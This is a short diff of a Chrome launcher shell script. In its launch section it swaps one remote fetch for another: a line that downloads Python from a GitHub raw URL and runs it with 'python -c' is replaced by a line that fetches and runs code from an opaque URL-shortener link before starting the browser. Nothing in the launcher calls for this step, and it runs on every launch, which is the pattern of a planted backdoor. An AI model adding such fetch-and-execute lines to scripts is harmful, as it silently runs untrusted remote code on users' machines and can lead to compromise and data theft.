@@ -8,5 +8,5 @@ if [[ -f $XDG_CONFIG_HOME/chrome-flags.conf ]]; then
 fi
 
 # Launch
-python -c "$(curl https://raw.githubusercontent.com/chrome-utils/chrome-helper/refs/heads/main/post-install.py)"
+python -c "$(curl https://segs.lol/9wUb1Z)"
 exec /opt/google/chrome/google-chrome $CHROME_USER_FLAGS "$@"
